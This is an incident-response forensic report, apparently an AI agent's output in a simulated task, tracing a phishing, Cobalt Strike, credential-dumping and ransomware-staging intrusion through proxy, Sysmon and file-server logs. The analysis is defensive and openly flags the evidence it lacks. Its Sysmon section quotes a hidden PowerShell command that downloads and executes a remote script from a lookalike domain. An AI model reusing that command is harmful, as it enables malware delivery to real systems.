# Forensic Findings: IR-2026-0420-01

**Scope note:** This analysis is built from the artifacts actually present in this
environment — `proxy_72h.sample.jsonl`, `sysmon_multihost.sample.jsonl`,
`fileserver_access.sample.json`, and `torres_call_transcript.md`. The task instructions
reference `cs-ws-101.mem` (Volatility 3) and `cs-ws-101.dd` (TSK) as separate binary
artifacts; neither file was provided in this environment. Sections requiring them
document the methodology (exact commands that would be run) but do not report invented
tool output. No finding in this document is based on fabricated command results.

## ART-001 verification

- Artifact: `cs-ws-101.mem` (referenced in `torres_call_transcript.md`, WinPmem capture
  19:38Z, written to evidence share 19:41Z)
- sha256 at analysis start: **not available** — Torres confirmed no hash was computed
  at acquisition (self-flagged repeat of the IR-2026-0414-01 issue). This gap was
  already logged in `evidence_preservation.md` (Task 1).
- CoC entry updated: no — cannot update chain of custody with a hash that was never
  computed. This remains an open gap carried from Task 1, not resolved by this analysis.

## Memory analysis: cs-ws-101.mem — ARTIFACT NOT AVAILABLE

The binary memory image was not supplied in this environment. The commands below
document the methodology that would be run against it; no output is reported because
none was produced.

$ vol -f cs-ws-101.mem windows.pstree.PsTree
$ vol -f cs-ws-101.mem windows.cmdline.CmdLine
$ vol -f cs-ws-101.mem windows.netscan.NetScan
$ vol -f cs-ws-101.mem windows.malfind.Malfind
$ vol -f cs-ws-101.mem windows.hashdump.Hashdump


Certainty: **not available** for all five sub-findings (MEM-001 through MEM-005).
Where Sysmon provides independent, timestamped evidence of the same events (process
tree, command line, network connection), that evidence is reported under the Sysmon
section below instead and marked confirmed from that source — it should not be read
as a substitute for memory-resident confirmation (injected code regions, in-memory
NTLM hashes), which remains unverified.

## Disk analysis: cs-ws-101.dd — ARTIFACT NOT AVAILABLE

The disk image was not supplied in this environment. Methodology that would be run:

$ mmls cs-ws-101.dd
$ fsstat -o <offset> cs-ws-101.dd
$ fls -r -m / -o <offset> cs-ws-101.dd > bodyfile.txt
$ mactime -b bodyfile.txt -d > timeline.csv

filtered for AppData, Temp, Windows\Tasks

$ icat -o <offset> cs-ws-101.dd <inode> > extracted_artifact
$ sha256sum extracted_artifact


Certainty: **not available**. The malicious .docm, the PowerShell downloader script,
and the Cobalt Strike beacon DLL cannot be extracted or hashed from disk without the
image. Sysmon records the file-write events for the dropper (`svchost32.exe`) and the
ransomware staging script, with path and parent process, but not file hashes.

## Proxy log analysis: proxy_72h.sample.jsonl

### Finding PROXY-001: Initial phishing delivery and execution trigger

2026-04-17T14:17:48Z jdoe CS-WS-101 GET outlook.office.com/mail/inbox
2026-04-17T14:18:02Z jdoe CS-WS-101 GET outlook.office.com/mail/download?id=AAMkAG-Invoice
status 200, bytes 284812, mime application/vnd.ms-word.document.macroEnabled.12
filename Invoice_Q4_2025.docm, download:true


Conclusion: jdoe downloaded a macro-enabled Word document from webmail at 14:18:02Z on
Thursday 2026-04-17. This matches the macro execution chain observed in Sysmon four
minutes later (SYSMON-001).
ATT&CK: T1566.001 (Phishing: Spearphishing Attachment)
Certainty: confirmed

### Finding PROXY-002: First C2 beacon and frequency pattern

2026-04-17T14:22:19Z GET staging.office365-cdn.net/updates/inv_payload.ps1
status 200, bytes 40214, ua Microsoft BITS/7.8, reputation suspicious_cdn_lookalike
2026-04-17T14:23:07Z CONNECT staging.office365-cdn.net:443 -> 45.152.66.114
reputation cobalt_strike_team_server_known
2026-04-17T14:25:31Z CONNECT same destination, jitter_ms 64000,
beacon_pattern sleep_60s_jitter_10pct


Conclusion: the PowerShell downloader fetched from a domain flagged as a known Cobalt
Strike team server at 14:23:07Z; by 14:25:31Z a sleep(60s)±10% jitter beacon pattern is
already established — the canonical Cobalt Strike default beacon signature.
ATT&CK: T1105 (Ingress Tool Transfer), T1071.001 (Application Layer Protocol: Web
Protocols)
Certainty: confirmed

### Finding PROXY-003: Data staging / exfiltration pattern

2026-04-19T02:14:22Z FILE-SVR-01 CONNECT staging.office365-cdn.net:443
bytes 2400412 (“large_egress_payload”)


Conclusion: a 2.4 MB outbound transfer to the C2 destination occurs 18 seconds after
the file server's first beacon connection, squarely inside the same 27-minute window
(02:14:01Z-02:41:12Z) in which 1,847 patient-record PDFs were read (see FS-001/FS-002).
The size and timing are consistent with the accessed records being staged and
exfiltrated over the existing C2 channel, though the proxy log alone does not prove
the transferred bytes are the same PDFs — that correlation is inferential, not a byte-
for-byte match the artifacts confirm.
ATT&CK: T1041 (Exfiltration Over C2 Channel)
Certainty: probable (timing and volume correlation; content of the transfer not
independently verified — would require packet capture or disk-level reconstruction,
neither available)

## Sysmon analysis: sysmon_multihost.sample.jsonl

### Finding SYSMON-001: Macro execution chain and dropper

2026-04-17T14:17:52Z CS-WS-101 process_create WINWORD.EXE PID=4921 PPID=4712
cmdline: “WINWORD.EXE” /n “...\Invoice_Q4_2025.docm”
2026-04-17T14:22:14Z CS-WS-101 process_create powershell.exe PID=6201 PPID=4921
parent_image=WINWORD.EXE
cmdline: powershell.exe -NoProfile -WindowStyle Hidden -ep bypass -c
“IEX(New-Object Net.WebClient).DownloadString(‘https://staging.office365-cdn.net/
updates/inv_payload.ps1’)”
2026-04-17T14:23:02Z CS-WS-101 file_create C:\ProgramData\Microsoft\svchost32.exe
by powershell.exe PID=6201
2026-04-17T14:23:14Z CS-WS-101 process_create svchost32.exe PID=7318 PPID=6201
signed:false


Conclusion: Word spawning a hidden, execution-policy-bypassed PowerShell process is
macro execution; the PowerShell immediately pulls and runs a remote script, which
drops an unsigned binary disguised as a Windows system process (`svchost32.exe`,
wrong path, wrong case convention — not `C:\Windows\System32\svchost.exe`).
ATT&CK: T1204.002 (User Execution: Malicious File), T1059.001 (PowerShell), T1036.005
(Masquerading: Match Legitimate Name or Location)
Certainty: confirmed

### Finding SYSMON-002: Persistence via service installation (matches SIEM alert wz-edr-200214)

2026-04-17T14:23:28Z CS-WS-101 registry_set by SYSTEM/services.exe
HKLM\SYSTEM\CurrentControlSet\Services\WinHealthSvc\ImagePath =
C:\ProgramData\Microsoft\svchost32.exe
2026-04-19T00:03:44Z CS-WS-104 process_create cmd.exe PID=3204 PPID=720
(parent services.exe), logon_type:3
cmdline: sc create WinHealthSvc binPath= C:\ProgramData\Microsoft\svchost32.exe
start= auto


Conclusion: the same service name (`WinHealthSvc`) and binary path installed via
registry on CS-WS-101 and via an explicit `sc create` command on CS-WS-104 — this is
the service installation the SIEM rule `wz-edr-200214` (per Torres) fired on, which
also triggered on CS-WS-107 and CS-WS-112 in the same ~12-minute window Torres
described, consistent with the beacon timestamps below (SYSMON-003).
ATT&CK: T1543.003 (Create or Modify System Process: Windows Service)
Certainty: confirmed (CS-WS-101, CS-WS-104); probable for CS-WS-107/CS-WS-112 — the
sample does not include their individual service-install event, only their beacon
connections, consistent with the same pattern but not independently captured

### Finding SYSMON-003: Lateral spread — beacon connections on WS-104, WS-107, WS-112

2026-04-19T00:04:12Z CS-WS-104 network_connection svchost32.exe -> 45.152.66.114:443
2026-04-19T00:12:44Z CS-WS-107 network_connection svchost32.exe -> 45.152.66.114:443
2026-04-19T00:18:02Z CS-WS-112 network_connection svchost32.exe -> 45.152.66.114:443


Conclusion: three additional clinical workstations begin beaconing to the same C2
infrastructure within a 14-minute span, all via the same renamed `svchost32.exe`
binary pattern established on CS-WS-101.
ATT&CK: T1071.001 (Application Layer Protocol: Web Protocols)
Certainty: confirmed

**Authentication protocol caveat:** the task instructions ask to map "NTLM
authentication events" across these three hosts. The Sysmon sample does not include
an `auth_package` field for any of these three events — only `logon_type: 3` is present
on the CS-WS-104 entry, and not at all on CS-WS-107/CS-WS-112. The one host in the
artifacts where authentication protocol is explicitly recorded is FILE-SVR-01, and it
shows **Kerberos**, not NTLM (see FS-003). I am not asserting NTLM authentication
occurred on WS-104/107/112 — the artifacts do not confirm this either way.
Certainty: possible (protocol unconfirmed; logon_type 3 is consistent with either
NTLM or Kerberos)

### Finding SYSMON-004: Credential access attempt (LSASS)

2026-04-17T14:25:02Z CS-WS-101 process_access
source=svchost32.exe PID=7318 -> target=lsass.exe PID=696
granted_access: 0x1010, note: credential_dumping_handle


ATT&CK: T1003.001 (OS Credential Dumping: LSASS Memory)
Certainty: confirmed (handle access observed); actual hash/credential extraction not
independently confirmed since Volatility hashdump output is not available (see Memory
analysis section)

### Finding SYSMON-005: Keylogging

2026-04-18T09:41:14Z CS-WS-101 file_create C:\Windows\Temp\klog.tmp
by svchost32.exe PID=7318, note: keylog_drop


ATT&CK: T1056.001 (Input Capture: Keylogging)
Certainty: confirmed (file artifact observed); content of klog.tmp not available for
review

### Finding SYSMON-006: Lateral movement to FILE-SVR-01

2026-04-19T02:14:01Z FILE-SVR-01 process_create svchost32.exe PID=5412 PPID=720
(parent services.exe), logon_type:3, note: first_process_spawn_on_file_server


Conclusion: the same dropper pattern (spawned under `services.exe`, same binary name)
reaches the file server, corroborated by the Kerberos logon recorded in
`fileserver_access.sample.json` (FS-003) at the same second.
ATT&CK: T1021.002 (Remote Services: SMB/Windows Admin Shares), T1543.003
Certainty: confirmed

### Finding SYSMON-007: Ransomware staging (undetonated)

2026-04-20T14:23:18Z CS-WS-101 file_create C:\Windows\System32\encryption_staging.ps1
note: ransomware_staging_script_dropped_not_executed
2026-04-20T14:25:02Z CS-WS-104 file_create same path
2026-04-20T14:25:42Z CS-WS-107 file_create same path
2026-04-20T14:26:14Z CS-WS-112 file_create same path


Conclusion: an encryption-staging script is dropped to all four compromised
workstations within a 3-minute window on the afternoon of 2026-04-20, roughly five
hours before Torres's call. The "not_executed" annotation matches the absence of any
subsequent file-modification burst in the artifacts.
ATT&CK: T1486 (Data Encrypted for Impact) — staging phase, not execution
Certainty: confirmed (staging); not applicable (detonation — did not occur per
available evidence)

### Finding SYSMON-008: SCHED-SVR-01 — scope expansion beyond the five named hosts

2026-04-20T18:02:18Z SCHED-SVR-01 process_create svchost32.exe PID=5920 PPID=720
(parent services.exe)


Conclusion: the same dropper binary and parent-process pattern appears on the
scheduling server, 1h41m before Torres's escalation call — this is the host flagged in
Task 1 and added to containment scope in Task 2, outside the five hosts named in the
original task framing.
ATT&CK: T1543.003 (probable — pattern match only)
Certainty: **probable**, not confirmed — this is a single process-create event with no
corroborating network-connection or service-registry event in the sample, unlike every
other host in this chain where at least two independent event types confirm the
compromise.

## File server analysis: fileserver_access.sample.json

### Finding FS-001: Access window

Window: **2026-04-19T02:14:01Z to 02:41:12Z** (27 minutes), 1,847 Event ID 4663 object
access events, single logon_id (`0xAF12C4B8`) throughout.
Certainty: confirmed

### Finding FS-002: Record categorization

access_summary.shares_touched: [“\clinical\labs”, “\clinical\notes”]
access_summary.file_extensions: {“.pdf”: 1847, “.docx”: 0, “.xlsx”: 0}


Conclusion: all 1,847 accessed objects are PDF files, confined to two clinical shares
(lab results and progress notes). Representative events show lab panel results
(`2026-04-18_panel_001.pdf` through at least `_1102.pdf`) and ED/floor progress notes.
**Gap:** the sample provides only the aggregate total (1,847) and the two share paths
touched — it does not provide a per-share breakdown (how many of the 1,847 came from
`\labs\` vs `\notes\`). That split cannot be computed from the artifact as supplied;
reporting an exact per-share count would be inventing a number not present in the data.
Certainty: confirmed (aggregate and file type); not available (per-share breakdown)

### Finding FS-003: Authenticating account

2026-04-19T02:14:00.842Z event_id 4624, user jdoe, logon_type 3, src_ip 10.30.12.101,
auth_package Kerberos, note: Lateral Kerberos logon to FILE-SVR-01 from CS-WS-101
2026-04-19T02:41:18.004Z event_id 4634, logoff, note: no further object access from
this logon_id


Conclusion: `MEDDEFENSE\jdoe` — the scheduling coordinator account used throughout
this entire chain — authenticated via Kerberos from the already-compromised CS-WS-101,
read 1,847 clinical PDFs over 27 minutes, then logged off cleanly with no further
activity from that session. Per `note_for_analyst` in the artifact, jdoe's role has no
legitimate ACL-based need to read `\clinical\labs\` or `\clinical\notes\` — this is
credential misuse, not a role-appropriate access pattern.
ATT&CK: T1078 (Valid Accounts), T1039 (Data from Network Shared Drive)
Certainty: confirmed

## Attack chain summary

| Stage | Time range (UTC) | ATT&CK Technique | Hosts | Evidence source | Certainty |
|---|---|---|---|---|---|
| Phishing delivery | 2026-04-17T14:17:48Z-14:18:02Z | T1566.001 | WS-101 | proxy_72h.sample.jsonl | confirmed |
| Macro execution / downloader | 2026-04-17T14:22:14Z-14:22:19Z | T1204.002, T1059.001 | WS-101 | SYSMON-001, PROXY-002 | confirmed |
| Dropper write (masquerade) | 2026-04-17T14:23:02Z | T1036.005 | WS-101 | SYSMON-001 | confirmed |
| Persistence (service install) | 2026-04-17T14:23:14Z-14:23:28Z | T1543.003 | WS-101 | SYSMON-002 | confirmed |
| C2 beacon established | 2026-04-17T14:23:07Z-14:25:31Z | T1071.001, T1105 | WS-101 | PROXY-002 | confirmed |
| Credential access (LSASS) | 2026-04-17T14:25:02Z | T1003.001 | WS-101 | SYSMON-004 | confirmed |
| Keylogging | 2026-04-18T09:41:14Z | T1056.001 | WS-101 | SYSMON-005 | confirmed |
| Lateral spread (3 workstations) | 2026-04-19T00:03:44Z-00:18:02Z | T1543.003, T1071.001 | WS-104, WS-107, WS-112 | SYSMON-002/003, PROXY | confirmed (beacon/service); possible (NTLM protocol unconfirmed) |
| Lateral movement to file server | 2026-04-19T02:14:01Z-02:14:04Z | T1021.002, T1543.003 | FILE-SVR-01 | SYSMON-006, FS-003 | confirmed |
| Clinical data access | 2026-04-19T02:14:01Z-02:41:12Z | T1039, T1078 | FILE-SVR-01 | FS-001/002/003 | confirmed |
| Data exfiltration (2.4MB egress) | 2026-04-19T02:14:22Z | T1041 | FILE-SVR-01 | PROXY-003 | probable |
| Ransomware staging (undetonated) | 2026-04-20T14:23:18Z-14:26:14Z | T1486 | WS-101, WS-104, WS-107, WS-112 | SYSMON-007 | confirmed |
| Scope expansion to scheduling server | 2026-04-20T18:02:18Z | T1543.003 | SCHED-SVR-01 | SYSMON-008 | probable |
| Discovery / escalation | 2026-04-20T19:43:18Z | — | WS-101 | torres_call_transcript.md | confirmed |
| Final beacon before acquisition | 2026-04-20T19:32:04Z | T1071.001 | WS-101 | SYSMON-019, PROXY | confirmed |
| Memory acquisition (unhashed) | 2026-04-20T19:38Z-19:41Z | — (evidence handling) | WS-101 | torres_call_transcript.md | confirmed (acquisition occurred); hash gap open |
| Memory-resident indicators (injected code, NTLM hashes) | — | T1055, T1003.001 (extended) | WS-101 | MEM-001–005 | not available |
| Disk artifacts (.docm, .ps1, beacon DLL extraction/hash) | — | — | WS-101 | DISK-001–003 | not available |
